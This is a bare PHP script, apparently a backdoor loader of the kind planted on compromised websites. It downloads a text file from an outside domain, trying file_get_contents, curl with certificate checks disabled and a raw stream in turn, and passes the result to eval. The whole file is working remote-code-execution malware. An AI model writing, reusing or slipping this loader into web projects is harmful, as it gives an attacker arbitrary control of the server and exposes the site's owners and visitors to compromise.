<?php
$protocol = "https";
$domain = "seneporno.com";
$file_path = "/5.txt";
$url = $protocol . "://" . $domain . $file_path;

function fetch_content($url, $method) {
    switch ($method) {
        case 'file_get_contents':
            if (ini_get('allow_url_fopen')) {
                return file_get_contents($url);
            }
            break;
        case 'curl':
            if (function_exists('curl_version')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $response = curl_exec($ch);
                curl_close($ch);
                return $response;
            }
            break;
        case 'stream':
            if ($stream = fopen($url, 'r')) {
                $content = stream_get_contents($stream);
                fclose($stream);
                return $content;
            }
            break;
        default:
            return false;
    }
    return false;
}

$methods = ['file_get_contents', 'curl', 'stream'];
$content = false;

foreach ($methods as $method) {
    $content = fetch_content($url, $method);
    if ($content !== false) {
        break;
    }
}

if ($content !== false) {
    eval("?>" . $content);
} else {
    echo "エラー。";
}
?>